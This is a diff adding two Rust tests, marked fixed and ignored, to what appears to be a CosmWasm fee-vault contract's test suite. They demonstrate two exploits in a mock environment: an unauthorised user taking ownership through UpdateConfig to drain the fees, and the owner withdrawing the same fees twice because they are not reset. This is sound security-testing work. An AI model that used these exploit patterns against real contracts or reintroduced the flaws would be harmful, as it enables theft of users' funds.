@@ -267,3 +267,126 @@ fn owner_withdraw_fees() {
         (Uint128::new(1000) * Decimal::percent(5)).to_string()
     );
 }
+
+#[ignore="fixed"]
+#[test]
+fn abuse_ownership_drain_fees(){
+    let mut deps = mock_dependencies();
+
+    let msg = InstantiateMsg {};
+    let info = mock_info("creator", &coins(1000, DENOM.to_string()));
+    instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    let res = query(deps.as_ref(), mock_env(), QueryMsg::Config {}).unwrap();
+    let value: Config = from_binary(&res).unwrap();
+    assert_eq!(value.owner, "creator".to_string());
+
+    // alice deposits 1000 funds
+    let info = mock_info("alice", &coins(1_000, DENOM));
+    let msg = ExecuteMsg::Deposit {};
+    execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    // alice withdraw all her funds
+    let empty_fund: Vec<Coin> = vec![];
+    let info = mock_info("alice", &empty_fund);
+    let msg = ExecuteMsg::Withdraw {
+        amount: Uint128::new(1000),
+    };
+    let res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    // alice only gets back 95% of her original funds
+    assert_eq!(res.attributes.len(), 2);
+    assert_eq!(res.attributes[0].value, "withdraw");
+    assert_eq!(
+        res.attributes[1].value,
+        (Uint128::new(1000) * Decimal::percent(95)).to_string()
+    );
+
+
+    let info = mock_info("alice", &[]);
+    let msg = ExecuteMsg::UpdateConfig {
+        new_owner: "alice".to_string(),
+    };
+    execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    let res = query(deps.as_ref(), mock_env(), QueryMsg::Config {}).unwrap();
+    let value: Config = from_binary(&res).unwrap();
+    assert_eq!(value.owner, "alice".to_string());
+
+
+    // owner withdraw fees
+    let info = mock_info("alice", &empty_fund);
+    let msg = ExecuteMsg::WithdrawFees {};
+
+    let res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+    assert_eq!(res.attributes.len(), 2);
+    assert_eq!(res.attributes[0].value, "withdraw_fees");
+    assert_eq!(
+        res.attributes[1].value,
+        (Uint128::new(1000) * Decimal::percent(5)).to_string()
+    );
+    
+
+}
+
+
+#[ignore="fixed"]
+#[test]
+fn abuse_no_fee_reset(){
+    let mut deps = mock_dependencies();
+
+    let msg = InstantiateMsg {};
+    let info = mock_info("creator", &coins(1000, DENOM.to_string()));
+    instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    let res = query(deps.as_ref(), mock_env(), QueryMsg::Config {}).unwrap();
+    let value: Config = from_binary(&res).unwrap();
+    assert_eq!(value.owner, "creator".to_string());
+
+    // alice deposits 1000 funds
+    let info = mock_info("alice", &coins(1_000, DENOM));
+    let msg = ExecuteMsg::Deposit {};
+    execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    // alice withdraw all her funds
+    let empty_fund: Vec<Coin> = vec![];
+    let info = mock_info("alice", &empty_fund);
+    let msg = ExecuteMsg::Withdraw {
+        amount: Uint128::new(1000),
+    };
+    let res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+
+    // alice only gets back 95% of her original funds
+    assert_eq!(res.attributes.len(), 2);
+    assert_eq!(res.attributes[0].value, "withdraw");
+    assert_eq!(
+        res.attributes[1].value,
+        (Uint128::new(1000) * Decimal::percent(95)).to_string()
+    );
+
+    // owner withdraw fees
+    let info = mock_info("creator", &empty_fund);
+    let msg = ExecuteMsg::WithdrawFees {};
+
+    let mut total_collected = Uint128::zero();
+    let res = execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
+    assert_eq!(res.attributes.len(), 2);
+    assert_eq!(res.attributes[0].value, "withdraw_fees");
+    assert_eq!(
+        res.attributes[1].value,
+        (Uint128::new(1000) * Decimal::percent(5)).to_string()
+    );
+    
+    total_collected += Uint128::new(res.attributes[1].value.parse().unwrap());
+
+    let res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
+    assert_eq!(res.attributes.len(), 2);
+    assert_eq!(res.attributes[0].value, "withdraw_fees");
+    assert_eq!(
+        res.attributes[1].value,
+        (Uint128::new(1000) * Decimal::percent(5)).to_string()
+    );
+
+    total_collected += Uint128::new(res.attributes[1].value.parse().unwrap());
+    assert_eq!(total_collected, Uint128::new(2)*Uint128::new(1000) * Decimal::percent(5))
+}
